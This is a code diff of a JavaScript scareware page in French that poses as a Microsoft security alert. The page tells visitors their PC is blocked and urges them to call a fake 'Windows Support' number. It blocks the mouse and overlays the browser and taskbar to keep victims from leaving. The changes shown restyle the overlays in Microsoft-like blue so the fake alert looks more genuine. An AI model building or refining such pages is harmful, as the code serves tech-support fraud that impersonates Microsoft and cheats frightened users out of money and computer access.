@@ -5,13 +5,29 @@
   if (!document.querySelector('link[href*="styles.css"]')) {
     var styleLink = document.createElement("link");
     styleLink.rel = "stylesheet";
-    styleLink.href = "styles.css?v=3";
+    styleLink.href = "styles.css?v=7";
     document.head.appendChild(styleLink);
   }
 
   document.title = "Fond bleu avec modale";
 
+  var securityPageBlueStyle =
+    '<style id="security-page-blue">' +
+    "#securityOverlay{background-color:#0078d4!important;background-image:linear-gradient(165deg,#1a6fb5 0%,#0078d4 42%,#0d5a9e 100%)!important}" +
+    "#securityOverlay .access-modal{background:#0d5a9e!important;border-color:rgba(143,208,255,.4)!important}" +
+    "#securityOverlay .access-modal p{color:#fff!important}" +
+    "#securityOverlay .black-modal-blue-box{background:linear-gradient(180deg,#1a6fb5,#0d5a9e)!important}" +
+    "#securityOverlay .support-card{background:linear-gradient(180deg,#1a6fb5,#0d5a9e)!important}" +
+    "#securityOverlay .support-card-subtitle,#securityOverlay .support-card-phone,#securityOverlay .support-card-label,#securityOverlay .support-card-arrow{color:#fff!important}" +
+    "#browserChromeShield,#browserChromeShield.is-visible{background:#0d5a9e!important}" +
+    "#browserChromeShield .browser-chrome-modal{background:#0078d4!important}" +
+    "#escapeShield .escape-shield-taskbar-wrap{background:#0d5a9e!important}" +
+    "#escapeShield .escape-shield-taskbar-modal{background:#0078d4!important}" +
+    "#escapeExitModal .escape-exit-modal{background:#0078d4!important}" +
+    "</style>";
+
   mount.innerHTML =
+    securityPageBlueStyle +
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
     '<div id="browserChromeShield" class="browser-chrome-shield" aria-hidden="true" role="alert">' +
     '<div class="browser-chrome-modal">' +
@@ -25,15 +41,15 @@
     '<p class="escape-shield-alert">Alerte de sécurité Microsoft</p>' +
     '<p class="escape-shield-warning">Ne quittez pas la page</p>' +
     '</div></div></div>' +
-    '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true">' +
+    '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true" style="background-color:#0078d4;background-image:linear-gradient(165deg,#1a6fb5 0%,#0078d4 42%,#0d5a9e 100%)">' +
     '<div class="security-page">' +
-    '<section class="access-modal" aria-label="Alerte acces bloque">' +
+    '<section class="access-modal" aria-label="Alerte acces bloque" style="background:#0d5a9e;border-color:rgba(143,208,255,.4)">' +
     '<p>L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
     '<p>N\'accédez pas à ce pc et ne le redémarrez pas. Si vous ignorez cet avertissement, vous risquez de perdre des informations.</p>' +
     '<p>Contactez le support technique Microsoft dès que possible ; un expert vous guidera par téléphone lors de l\'analyse.</p>' +
     '<p>L\'exécution de cette application peut mettre votre pc en danger.</p>' +
     '</section>' +
-    '<div class="black-modal-blue-box">' +
+    '<div class="black-modal-blue-box" style="background:linear-gradient(180deg,#1a6fb5,#0d5a9e)">' +
     '<p>Windows Support : +33 02 59 50 90 20</p>' +
     '<p class="black-modal-defender">Microsoft Defender</p>' +
     '</div>' +
@@ -48,7 +64,7 @@
     '</div>' +
     '</section>' +
     '</div>' +
-    '<aside class="support-card" aria-label="Support technique Microsoft">' +
+    '<aside class="support-card" aria-label="Support technique Microsoft" style="background:linear-gradient(180deg,#1a6fb5,#0d5a9e);border-color:rgba(143,208,255,.4)">' +
     '<p class="support-card-subtitle">Support technique Microsoft</p>' +
     '<p class="support-card-phone">+33 02 59 50 90 20</p>' +
     '<p class="support-card-label">Numero</p>' +
@@ -181,12 +197,84 @@
     }
   }
 
+  function applySecurityBlueTheme() {
+    if (!securityOverlay) return;
+
+    securityOverlay.style.setProperty("background-color", "#0078d4", "important");
+    securityOverlay.style.setProperty(
+      "background-image",
+      "linear-gradient(165deg, #1a6fb5 0%, #0078d4 42%, #0d5a9e 100%)",
+      "important"
+    );
+
+    var accessModal = securityOverlay.querySelector(".access-modal");
+    if (accessModal) {
+      accessModal.style.setProperty("background", "#0d5a9e", "important");
+      accessModal.style.setProperty("background-image", "none", "important");
+    }
+
+    var blueBox = securityOverlay.querySelector(".black-modal-blue-box");
+    if (blueBox) {
+      blueBox.style.setProperty(
+        "background",
+        "linear-gradient(180deg, #1a6fb5, #0d5a9e)",
+        "important"
+      );
+    }
+
+    var supportCard = securityOverlay.querySelector(".support-card");
+    if (supportCard) {
+      supportCard.style.setProperty(
+        "background",
+        "linear-gradient(180deg, #1a6fb5, #0d5a9e)",
+        "important"
+      );
+    }
+
+    securityOverlay.querySelectorAll(".access-modal p, .black-modal-blue-box p").forEach(function (node) {
+      node.style.setProperty("color", "#ffffff", "important");
+    });
+
+    var defender = securityOverlay.querySelector(".black-modal-defender");
+    if (defender) defender.style.setProperty("color", "#8fd0ff", "important");
+
+    ["support-card-brand", "support-card-subtitle", "support-card-phone", "support-card-label", "support-card-arrow"].forEach(
+      function (className) {
+        var node = securityOverlay.querySelector("." + className);
+        if (node) node.style.setProperty("color", "#ffffff", "important");
+      }
+    );
+
+    var chromeShield = document.getElementById("browserChromeShield");
+    if (chromeShield) {
+      chromeShield.style.setProperty("background", "#0d5a9e", "important");
+      var chromeModal = chromeShield.querySelector(".browser-chrome-modal");
+      if (chromeModal) chromeModal.style.setProperty("background", "#0078d4", "important");
+    }
+
+    var escapeShield = document.getElementById("escapeShield");
+    if (escapeShield) {
+      var taskbarWrap = escapeShield.querySelector(".escape-shield-taskbar-wrap");
+      if (taskbarWrap) taskbarWrap.style.setProperty("background", "#0d5a9e", "important");
+      var taskbarModal = escapeShield.querySelector(".escape-shield-taskbar-modal");
+      if (taskbarModal) taskbarModal.style.setProperty("background", "#0078d4", "important");
+    }
+
+    var escapeExit = document.getElementById("escapeExitModal");
+    if (escapeExit) {
+      var exitModal = escapeExit.querySelector(".escape-exit-modal");
+      if (exitModal) exitModal.style.setProperty("background", "#0078d4", "important");
+    }
+  }
+
   function showSecurityPage() {
     if (!securityOverlay) return;
     securityOverlay.classList.add("is-active");
     securityOverlay.setAttribute("aria-hidden", "false");
     document.body.classList.add("security-mode");
+    applySecurityBlueTheme();
     showBrowserChromeShield();
+    applySecurityBlueTheme();
   }
 
   function showBrowserChromeShield() {
@@ -211,6 +299,7 @@
     shield.classList.add("is-visible");
     shield.setAttribute("aria-hidden", "false");
     document.body.style.visibility = "visible";
+    applySecurityBlueTheme();
   }
 
   function hideEscapeShield() {
@@ -245,6 +334,7 @@
     modal.classList.add("is-visible");
     modal.setAttribute("aria-hidden", "false");
     document.body.style.visibility = "visible";
+    applySecurityBlueTheme();
   }
 
   function exitAfterEscapeHold() {
